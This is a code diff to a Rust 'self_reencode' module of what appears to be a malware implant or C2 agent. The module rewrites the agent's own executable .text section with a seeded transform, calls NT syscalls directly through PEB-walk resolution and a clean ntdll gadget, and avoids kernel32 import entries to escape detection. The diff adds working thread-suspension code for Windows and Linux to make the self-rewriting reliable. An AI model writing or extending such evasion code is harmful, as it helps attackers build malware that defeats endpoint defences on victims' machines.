@@ -13,10 +13,10 @@
 //!
 //! # Safety
 //!
-//! This module modifies executable memory in-place.  It must be called only
-//! from a dedicated task while no other task is executing code in the region
-//! being rewritten.  In practice the agent's async runtime is cooperative, so
-//! the re-encoding task has exclusive use of the CPU while it is running.
+//! This module modifies executable memory in-place.  Before changing page
+//! protections, all sibling OS threads are suspended via `NtSuspendThread`
+//! (Windows) or `SIGSTOP` via `tgkill` (Linux).  Threads are resumed after
+//! the instruction-cache flush completes.
 //!
 //! The clean ntdll mapping used for the syscall gadget is **not** touched —
 //! only the agent's own `.text` section is rewritten.
@@ -247,6 +247,415 @@ fn find_load_base() -> Result<usize> {
     anyhow::bail!("self_reencode: could not determine load base from /proc/self/maps")
 }
 
+// ── Thread-freeze infrastructure ──────────────────────────────────────────
+//
+// Before rewriting the .text section we must suspend all sibling threads so
+// that no CPU is executing code in the region whose page protections are about
+// to change.  The original comment claimed cooperative scheduling gives
+// exclusive CPU access — this is incorrect for OS threads outside the tokio
+// runtime (e.g. blocking helper threads, background I/O threads).
+
+/// Maximum time threads may be frozen before a warning is emitted.
+const FREEZE_WARN_SECS: u64 = 30;
+
+// ── Windows thread freeze ─────────────────────────────────────────────────
+
+/// Suspended thread state.  On drop, any threads that have not yet been
+/// resumed are thawed automatically (safety net for panics).
+#[cfg(windows)]
+struct FrozenThreads {
+    /// (thread handle, previous suspend count) for each suspended thread.
+    handles: Vec<(usize, u32)>,
+    /// Instant when `freeze_threads()` finished suspending.
+    frozen_at: std::time::Instant,
+    /// Whether `thaw()` has already been called.
+    thawed: bool,
+}
+
+#[cfg(windows)]
+impl FrozenThreads {
+    /// Resume all frozen threads in reverse suspension order, close handles.
+    fn thaw(&mut self) {
+        if self.thawed {
+            return;
+        }
+        self.thawed = true;
+
+        let elapsed = self.frozen_at.elapsed();
+        if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
+            log::warn!(
+                "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
+                elapsed.as_secs_f64()
+            );
+        }
+
+        while let Some((handle, _prev)) = self.handles.pop() {
+            let mut dummy: u32 = 0;
+            let _ = nt_syscall::syscall!(
+                "NtResumeThread",
+                handle as u64,
+                &mut dummy as *mut u32 as u64
+            );
+            let _ = nt_syscall::syscall!("NtClose", handle as u64);
+        }
+        log::debug!("self_reencode: all sibling threads resumed");
+    }
+}
+
+#[cfg(windows)]
+impl Drop for FrozenThreads {
+    fn drop(&mut self) {
+        if !self.thawed {
+            log::warn!("self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming");
+            self.thaw();
+        }
+    }
+}
+
+/// Read the current thread ID from the TEB without calling kernel32.
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn current_tid() -> usize {
+    unsafe {
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        // TEB.ClientId is at offset 0x40; UniqueThread at 0x48.
+        ((teb as *const usize).add(0x48 / std::mem::size_of::<usize>())).read()
+    }
+}
+
+/// Read the current process ID from the TEB without calling kernel32.
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn current_pid() -> usize {
+    unsafe {
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        // TEB.ClientId.UniqueProcess at offset 0x40.
+        ((teb as *const usize).add(0x40 / std::mem::size_of::<usize>())).read()
+    }
+}
+
+/// Suspend all threads in the current process except the calling thread.
+///
+/// Uses `NtQuerySystemInformation(SystemProcessInformation)` to enumerate
+/// threads, `NtOpenThread` + `NtSuspendThread` to freeze them.  All NT
+/// functions are resolved via `nt_syscall` (PEB-walk SSN resolution) — no
+/// kernel32 IAT entries are added.
+#[cfg(windows)]
+fn freeze_threads() -> Result<FrozenThreads> {
+    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+
+    // ── NT structures for NtQuerySystemInformation(SystemProcessInformation) ──
+    //
+    // We use raw byte offsets into SYSTEM_PROCESS_INFORMATION rather than a
+    // full `#[repr(C)]` struct because the header is large and the layout
+    // has been stable on 64-bit Windows since Windows XP.
+    //
+    // Key offsets (x86_64):
+    //   +0x000  NextEntryOffset   (ULONG, 4)
+    //   +0x004  NumberOfThreads   (ULONG, 4)
+    //   +0x050  UniqueProcessId   (HANDLE, 8)
+    //   +0x100  Threads[0]        (SYSTEM_THREAD_INFORMATION array)
+    //
+    // SYSTEM_THREAD_INFORMATION per thread (x86_64, stride = 0x50):
+    //   +0x028  ClientId.UniqueProcess (HANDLE, 8)
+    //   +0x030  ClientId.UniqueThread  (HANDLE, 8)
+
+    const SPI_NEXT_ENTRY_OFFSET: usize = 0x000;
+    const SPI_NUMBER_OF_THREADS: usize = 0x004;
+    const SPI_UNIQUE_PROCESS_ID: usize = 0x050;
+    const SPI_THREADS_START: usize = 0x100;
+
+    const STI_STRIDE: usize = 0x050;
+    const STI_CLIENT_ID_THREAD: usize = 0x030;
+
+    const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
+    const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
+
+    const THREAD_SUSPEND_RESUME: u32 = 0x0002;
+
+    let my_tid = current_tid();
+    let my_pid = current_pid();
+
+    // ── Query SystemProcessInformation ───────────────────────────────────
+
+    let mut buf_len: u32 = 0x1_0000; // start with 64 KiB
+    let buf: Vec<u8> = loop {
+        let mut buf = vec![0u8; buf_len as usize];
+        let mut return_len: u32 = 0;
+        let status = nt_syscall::syscall!(
+            "NtQuerySystemInformation",
+            SYSTEM_PROCESS_INFORMATION_CLASS as u64,
+            buf.as_mut_ptr() as u64,
+            buf_len as u64,
+            &mut return_len as *mut u32 as u64
+        )
+        .map_err(|e| anyhow::anyhow!("NtQuerySystemInformation resolve failed: {e}"))?;
+
+        if status >= 0 {
+            break buf;
+        }
+        if (status as u32) == STATUS_INFO_LENGTH_MISMATCH {
+            buf_len = return_len.max(buf_len * 2);
+            continue;
+        }
+        anyhow::bail!(
+            "NtQuerySystemInformation returned NTSTATUS {:#010x}",
+            status
+        );
+    };
+
+    // ── Walk the linked list to find our process ─────────────────────────
+
+    let mut offset = 0usize;
+    let mut found = false;
+
+    loop {
+        if offset + SPI_THREADS_START >= buf.len() {
+            anyhow::bail!(
+                "self_reencode: SYSTEM_PROCESS_INFORMATION buffer too small at offset {offset:#x}"
+            );
+        }
+
+        let next_entry =
+            u32::from_ne_bytes(buf[offset + SPI_NEXT_ENTRY_OFFSET..][..4].try_into().unwrap());
+        let num_threads =
+            u32::from_ne_bytes(buf[offset + SPI_NUMBER_OF_THREADS..][..4].try_into().unwrap());
+        let pid =
+            usize::from_ne_bytes(buf[offset + SPI_UNIQUE_PROCESS_ID..][..8].try_into().unwrap());
+
+        if pid == my_pid {
+            found = true;
+
+            // ── Suspend sibling threads ──────────────────────────────────
+
+            let mut handles: Vec<(usize, u32)> = Vec::with_capacity(num_threads as usize);
+            let threads_base = offset + SPI_THREADS_START;
+
+            for i in 0..num_threads as usize {
+                let ti = threads_base + i * STI_STRIDE;
+                if ti + STI_STRIDE > buf.len() {
+                    break;
+                }
+                let tid = usize::from_ne_bytes(
+                    buf[ti + STI_CLIENT_ID_THREAD..][..8].try_into().unwrap(),
+                );
+
+                // Skip the calling thread.
+                if tid == my_tid {
+                    continue;
+                }
+
+                // Open a handle with THREAD_SUSPEND_RESUME access.
+                let mut obj_attr: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+                obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+
+                // CLIENT_ID { UniqueProcess, UniqueThread }
+                #[repr(C)]
+                struct ClientId {
+                    unique_process: usize,
+                    unique_thread: usize,
+                }
+                let cid = ClientId {
+                    unique_process: 0, // match any process
+                    unique_thread: tid,
+                };
+
+                let mut handle: usize = 0;
+                let open_status = nt_syscall::syscall!(
+                    "NtOpenThread",
+                    &mut handle as *mut usize as u64,
+                    THREAD_SUSPEND_RESUME as u64,
+                    &obj_attr as *const OBJECT_ATTRIBUTES as u64,
+                    &cid as *const ClientId as u64
+                );
+
+                match open_status {
+                    Ok(s) if s >= 0 => {
+                        // Successfully opened — suspend it.
+                        let mut prev_suspend: u32 = 0;
+                        let susp_status = nt_syscall::syscall!(
+                            "NtSuspendThread",
+                            handle as u64,
+                            &mut prev_suspend as *mut u32 as u64
+                        );
+                        match susp_status {
+                            Ok(s) if s >= 0 => {
+                                handles.push((handle, prev_suspend));
+                            }
+                            Ok(s) => {
+                                log::warn!(
+                                    "self_reencode: NtSuspendThread(tid={:#x}) returned {:#010x}, closing handle",
+                                    tid, s
+                                );
+                                let _ = nt_syscall::syscall!("NtClose", handle as u64);
+                            }
+                            Err(e) => {
+                                log::warn!(
+                                    "self_reencode: NtSuspendThread resolve failed for tid={:#x}: {e}, closing handle",
+                                    tid
+                                );
+                                let _ = nt_syscall::syscall!("NtClose", handle as u64);
+                            }
+                        }
+                    }
+                    Ok(s) => {
+                        // Access denied or similar — skip silently.
+                        log::debug!(
+                            "self_reencode: NtOpenThread(tid={:#x}) returned {:#010x}, skipping",
+                            tid, s
+                        );
+                    }
+                    Err(e) => {
+                        log::debug!(
+                            "self_reencode: NtOpenThread resolve failed for tid={:#x}: {e}",
+                            tid
+                        );
+                    }
+                }
+            }
+
+            log::info!(
+                "self_reencode: froze {} sibling threads (my_tid={:#x})",
+                handles.len(),
+                my_tid
+            );
+
+            return Ok(FrozenThreads {
+                handles,
+                frozen_at: std::time::Instant::now(),
+                thawed: false,
+            });
+        }
+
+        // Advance to the next process entry.
+        if next_entry == 0 {
+            break;
+        }
+        offset += next_entry as usize;
+    }
+
+    if !found {
+        anyhow::bail!(
+            "self_reencode: could not find current process (pid={:#x}) in SystemProcessInformation",
+            my_pid
+        );
+    }
+
+    // Unreachable, but the compiler doesn't know that.
+    anyhow::bail!("self_reencode: unexpected end of thread enumeration");
+}
+
+// ── Linux thread freeze ───────────────────────────────────────────────────
+
+#[cfg(target_os = "linux")]
+struct FrozenThreads {
+    /// TIDs that were sent SIGSTOP.
+    tids: Vec<i32>,
+    /// Process ID (needed for tgkill to resume).
+    pid: i32,
+    /// Instant when freeze completed.
+    frozen_at: std::time::Instant,
+    /// Whether `thaw()` has already been called.
+    thawed: bool,
+}
+
+#[cfg(target_os = "linux")]
+impl FrozenThreads {
+    fn thaw(&mut self) {
+        if self.thawed {
+            return;
+        }
+        self.thawed = true;
+
+        let elapsed = self.frozen_at.elapsed();
+        if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
+            log::warn!(
+                "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
+                elapsed.as_secs_f64()
+            );
+        }
+
+        // Resume in reverse order.
+        while let Some(tid) = self.tids.pop() {
+            let _ = unsafe {
+                libc::syscall(
+                    libc::SYS_tgkill,
+                    self.pid,
+                    tid,
+                    libc::SIGCONT as libc::c_long,
+                )
+            };
+        }
+        log::debug!("self_reencode: all sibling threads resumed (SIGCONT)");
+    }
+}
+
+#[cfg(target_os = "linux")]
+impl Drop for FrozenThreads {
+    fn drop(&mut self) {
+        if !self.thawed {
+            log::warn!("self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming");
+            self.thaw();
+        }
+    }
+}
+
+/// Suspend all threads in the current process except the calling thread.
+///
+/// Reads `/proc/self/task/` to enumerate TIDs and sends `SIGSTOP` via
+/// `tgkill` to each non-current thread.
+#[cfg(target_os = "linux")]
+fn freeze_threads() -> Result<FrozenThreads> {
+    let pid = unsafe { libc::getpid() };
+    let my_tid = unsafe { libc::gettid() };
+
+    let task_dir =
+        std::fs::read_dir("/proc/self/task").context("self_reencode: read /proc/self/task")?;
+
+    let mut tids: Vec<i32> = Vec::new();
+
+    for entry in task_dir.flatten() {
+        let name = entry.file_name();
+        let name_str = name.to_string_lossy();
+        if let Ok(tid) = name_str.parse::<i32>() {
+            if tid == my_tid {
+                continue;
+            }
+            // Send SIGSTOP via tgkill (not kill, to be precise about target).
+            let ret = unsafe {
+                libc::syscall(
+                    libc::SYS_tgkill,
+                    pid,
+                    tid,
+                    libc::SIGSTOP as libc::c_long,
+                )
+            };
+            if ret == 0 {
+                tids.push(tid);
+            } else {
+                log::debug!(
+                    "self_reencode: tgkill(SIGSTOP, tid={}) failed: {}",
+                    tid,
+                    std::io::Error::last_os_error()
+                );
+            }
+        }
+    }
+
+    log::info!(
+        "self_reencode: froze {} sibling threads (my_tid={})",
+        tids.len(),
+        my_tid
+    );
+
+    Ok(FrozenThreads {
+        tids,
+        pid,
+        frozen_at: std::time::Instant::now(),
+        thawed: false,
+    })
+}
+
 // ── Core re-encoding logic ────────────────────────────────────────────────
 
 /// Apply the code_transform pipeline to the agent's .text section with the
@@ -254,10 +663,9 @@ fn find_load_base() -> Result<usize> {
 ///
 /// # Safety
 ///
-/// This modifies executable memory.  Must be called from a context where no
-/// other code in the .text section is currently executing (i.e., from a
-/// dedicated re-encoding task that only uses stack-local code and library
-/// calls).
+/// This modifies executable memory in-place.  All sibling threads are
+/// suspended via `NtSuspendThread` (Windows) or `SIGSTOP` (Linux) before
+/// page protections are changed, and resumed after the I-cache flush.
 pub unsafe fn reencode_text(seed: u64) -> Result<()> {
     let text = find_text_section().context("self_reencode: locate .text section")?;
 
@@ -304,7 +712,10 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
 
     let write_len = transformed.len().min(text.size);
 
-    // 3. Make pages writable, write transformed code, restore protections.
+    // 3. Freeze sibling threads before touching page protections.
+    let mut frozen = freeze_threads().context("self_reencode: freeze sibling threads")?;
+
+    // 4. Make pages writable, write transformed code, restore protections.
     let old_prot = make_writable(text.base, text.size)
         .context("self_reencode: make .text writable")?;
 
@@ -324,8 +735,11 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
     restore_protection(text.base, text.size, &old_prot)
         .context("self_reencode: restore .text protections")?;
 
-    // 4. Flush the instruction cache.
+    // 5. Flush the instruction cache.
     flush_icache(text.base, text.size);
+
+    // 6. Resume sibling threads now that .text is back to RX and flushed.
+    frozen.thaw();
 
     log::info!(
         "self_reencode: successfully re-encoded {} bytes of .text with seed 0x{:016x}",
